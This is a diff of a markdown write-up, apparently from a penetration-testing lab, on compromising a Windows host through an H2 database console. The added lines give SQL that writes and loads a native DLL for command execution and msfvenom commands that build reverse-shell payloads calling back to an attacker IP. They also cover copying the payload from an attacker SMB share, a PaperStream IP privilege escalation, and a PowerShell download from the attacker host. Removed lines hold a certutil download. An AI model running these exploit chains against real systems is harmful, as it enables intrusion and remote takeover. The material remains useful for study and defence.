@@ -52,40 +52,51 @@ sa:tisadmin
 # no password is set
 sa:<nothing> works
 
-http://192.168.105.x:8082/login.do?jsessionid=2657f960b16d6abce3d39a14b845e511
-Connected to db.
+https://www.exploit-db.com/exploits/49384
 
-Exploit
-(manual) - https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2
+If we execute the following SQL statements we get RCE:
+-- Write native library
+SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90), ... ,CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');
 
-# 1. creating new database with new user
-Database "C:/Users/tony/kashz" not found, and IFEXISTS=true, so we cant auto-create it [90146-199] 90146/90146 (Help)
+-- Load native library
+CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
+CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
 
-# 2. FILE_READ
-SELECT FILE_READ ('C:\Users\Public\Desktop\desktop.ini',NULL);
-
-# 3. FILE_WRITE
-SELECT FILE_WRITE ('kashz kashz kashz','C:\Users\Public\Desktop\kashz.txt');
-IO Exception: "java.io.FileNotFoundException: C:\Users\Public\Desktop\kashz.txt (Access is denied)"; "C:\Users\Public\Desktop\kashz.txt"; SQL statement:
-
-# 4. Create alias and try to run cmds and Run alias
-CREATE ALIAS KASHZ AS $$ String shellexec(String cmd) throws java.io.IOException {
-java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
-return s.hasNext() ? s.next() : ""; }$$;
-CALL KASHZ('whoami');
-
-# manual didn't work
-(direct commands) - https://www.exploit-db.com/exploits/49384
+-- Evaluate script
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
-jacko\tony
 
-# powershell did not work; so absolute path
-CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c $host").getInputStream()).useDelimiter("\\Z").next()');
+With this, we can run the systeminfo command. This shows us that the architecture is x64.
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.103 LPORT=445 -f exe > reverse.exe
 
-# test file download and read
-# try different path for download
-CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -f http://192.168.49.105/kashz.txt C:\\Users\\Tony\\Documents\\kashz.txt").getInputStream()).useDelimiter("\\Z").next()');
+copy files via SMB, so it likely won't be blocked by the firewall.
+Copy the payload to the victim machine via SMB:
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.x\\ROPNOP\\reverse.exe c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
 
-SELECT FILE_READ ('C:\Users\Tony\Documents\kashz.txt',NULL);
+Running the payload:
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
+```
 
-# works
+## Privesc
+```
+Always check for vulnerable apps if WinPEAS does not find anything useful:
+dir "C:\Program Files (x86)"
+```
+## PaperStream
+```
+We can check the PaperStream IP version, it is 1.42.
+This version is vulnerable to a privilege escalation vulnerability.
+https://www.exploit-db.com/exploits/49382
+msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=tun0 LPORT=445
+
+Transfer with Powershell
+After we locate the location of powershell.exe, we can transfer.
+
+$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("http://192.168.49.103/49382.ps1","C:\users\tony\49382.ps1")
+Run the exploit: C:\users\tony\49382.ps1
+NT authority gained. 
+
+```
+
+
+
